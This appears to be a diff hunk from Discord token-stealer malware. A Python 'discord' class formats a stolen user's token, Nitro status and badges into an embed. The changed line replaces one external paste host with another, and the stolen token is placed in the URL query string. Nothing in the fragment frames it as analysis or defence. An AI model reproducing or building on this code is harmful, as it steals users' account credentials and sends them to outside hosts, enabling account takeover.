@@ -172,7 +172,7 @@ class discord():
             embed = Embed(title=f"{username} ({userid})", color=0x000000)
             embed.set_thumbnail(url=avatar)
             embed.add_field(name="<a:pinkcrown:996004209667346442> Token:",
-                            value=f"```{token}```\n[Click to copy!](https://paste.addi00000.repl.co/?p={token})\n\u200b", inline=False)
+                            value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
             embed.add_field(
                 name="<a:nitroboost:996004213354139658> Nitro:", value=f"{nitro}", inline=True)
             embed.add_field(name="<a:redboost:996004230345281546> Badges:",
